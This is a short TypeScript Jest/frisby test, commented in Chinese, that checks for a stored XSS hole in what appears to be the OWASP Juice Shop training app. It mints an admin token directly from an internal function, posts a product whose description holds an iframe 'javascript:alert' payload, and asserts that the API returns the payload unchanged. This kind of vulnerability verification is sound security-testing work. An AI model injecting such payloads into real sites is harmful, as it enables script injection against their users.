// 1. 注入你的 benign_dependencies
import * as frisby from 'frisby';
// 注意：这里能直接使用相对路径调用内部模块，正是“白盒”的体现！
import * as security from '../../lib/insecurity';

const API_URL = 'http://localhost:3000/api';
// 白盒特权：不走正常登录流程，直接用内部函数签发高权限 Token
const authHeader = { Authorization: 'Bearer ' + security.authorize(), 'content-type': 'application/json' };

// 2. 包装 Jest 测试块
describe('白盒漏洞验证：API-only XSS', () => {
    it('应当成功将带有 <iframe...> 的 payload 注入数据库并返回', () => {

        // 3. 注入你的 poc_executable_code
        return frisby.post(API_URL + '/Products', {
            headers: authHeader,
            body: {
                name: 'XSS Juice (42ml)',
                description: '<iframe src="javascript:alert(`xss`)">',
                price: 9999.99,
                image: 'xss3juice.jpg'
            }
        })
            // 4. 断言 (Assertions) 决定了漏洞是否存在
            .expect('status', 201) // 预期 API 接受了创建请求
            .expect('json', 'data', { description: '<iframe src="javascript:alert(`xss`)">' }); // 预期后端原样返回了恶意载荷
    });
});